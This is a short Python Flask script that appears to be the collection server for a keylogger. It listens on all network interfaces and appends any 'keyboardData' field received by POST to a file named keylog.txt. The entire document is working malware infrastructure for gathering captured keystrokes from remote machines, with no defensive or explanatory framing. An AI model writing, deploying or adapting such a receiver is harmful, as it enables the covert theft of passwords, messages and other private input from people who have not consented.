from flask import Flask, request, jsonify

app = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])
def log_data():
    if request.method == 'GET':
        return "Server is running!", 200
    elif request.method == 'POST':
        try:
            data = request.json
            if data and "keyboardData" in data:
                with open('keylog.txt', 'a') as f:
                    f.write(data['keyboardData'])
                return jsonify({"status": "success"}), 200
            else:
                return jsonify({"status": "no_data"}), 400
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
